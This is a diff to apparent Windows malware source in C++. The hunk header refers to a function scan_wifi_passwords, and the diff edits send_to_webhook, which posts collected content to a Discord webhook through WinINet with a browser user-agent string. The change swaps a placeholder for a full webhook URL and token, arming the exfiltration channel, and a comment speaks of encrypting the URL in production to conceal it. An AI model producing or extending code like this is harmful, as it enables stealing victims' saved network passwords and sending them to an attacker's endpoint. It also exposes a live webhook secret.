@@ -182,7 +182,7 @@ std::string scan_wifi_passwords() {
 
 void send_to_webhook(const std::string& content) {
     // Webhook URL (plaintext for testing; would be encrypted in production)
-    const char* webhook = "https://discord.com/api/webhooks/REPLACE_WITH_YOUR_WEBHOOK";
+    const char* webhook = "https://discord.com/api/webhooks/1562127067217137827/ZGHSIVN5HeKCqziDQ_SkgMzhhqwdXGNZDXScjuVHi6qTU8bC0vTvo_PXdw63_B09zZw4";
 
     HINTERNET session = InternetOpenA("Mozilla/5.0", INTERNET_OPEN_TYPE_DIRECT, nullptr, nullptr, 0);
     if (!session) return;
@@ -192,7 +192,7 @@ void send_to_webhook(const std::string& content) {
     
     if (connection) {
         HINTERNET request = HttpOpenRequestA(connection, "POST", 
-            "/api/webhooks/REPLACE_WITH_YOUR_WEBHOOK", "HTTP/1.1", nullptr, nullptr, 
+            "https://discord.com/api/webhooks/1562127067217137827/ZGHSIVN5HeKCqziDQ_SkgMzhhqwdXGNZDXScjuVHi6qTU8bC0vTvo_PXdw63_B09zZw4", "HTTP/1.1", nullptr, nullptr, 
             INTERNET_FLAG_SECURE, 0);
         
         if (request) {
